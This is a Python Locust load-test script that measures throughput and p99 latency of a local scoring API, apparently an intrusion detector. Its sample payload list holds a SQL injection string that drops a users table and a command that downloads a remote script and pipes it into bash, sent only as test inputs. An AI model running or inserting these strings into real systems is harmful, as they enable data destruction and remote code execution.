"""Locust load test for the scoring API — throughput & p99 latency.

This is how the eval gate's p99-latency budget (configs: eval_gate.max_p99_latency_ms)
is validated against a *running* service, and the evidence behind the "FastAPI for
low-latency serving" decision.

Run (service must be up, e.g. `uv run td serve`):
    uv sync --group serving --group cloud      # installs locust
    uv run locust -f load/locustfile.py --host http://127.0.0.1:8000

Then open http://localhost:8089, set users/spawn-rate, and watch the p99 column.
Headless example:
    uv run locust -f load/locustfile.py --host http://127.0.0.1:8000 \
        --users 50 --spawn-rate 10 --run-time 1m --headless
"""

from __future__ import annotations

import random

from locust import HttpUser, between, task

# A representative flow feature payload (values are illustrative; the service
# imputes/scales whatever it receives). Real load tests would replay sampled
# production events.
_SAMPLE_FEATURES = {
    "Destination Port": 80.0,
    "Flow Duration": 12000.0,
    "Total Fwd Packets": 10.0,
    "Total Backward Packets": 8.0,
    "Flow Bytes/s": 5000.0,
    "SYN Flag Count": 1.0,
    "Packet Length Mean": 240.0,
}

_PAYLOADS = [
    "ls -la /home/alice",
    "git pull origin main",
    "'; DROP TABLE users; --",
    "$(curl http://1.2.3.4/x.sh | bash)",
    "GET /api/v1/orders?page=2 HTTP/1.1",
]


class ScoringUser(HttpUser):
    wait_time = between(0.0, 0.05)

    @task(3)
    def score(self) -> None:
        self.client.post(
            "/score",
            json={"features": _SAMPLE_FEATURES, "payload": random.choice(_PAYLOADS)},
            name="/score",
        )

    @task(1)
    def batch(self) -> None:
        events = [{"features": _SAMPLE_FEATURES, "payload": random.choice(_PAYLOADS)} for _ in range(10)]
        self.client.post("/batch", json={"events": events}, name="/batch")

    @task(1)
    def health(self) -> None:
        self.client.get("/health", name="/health")
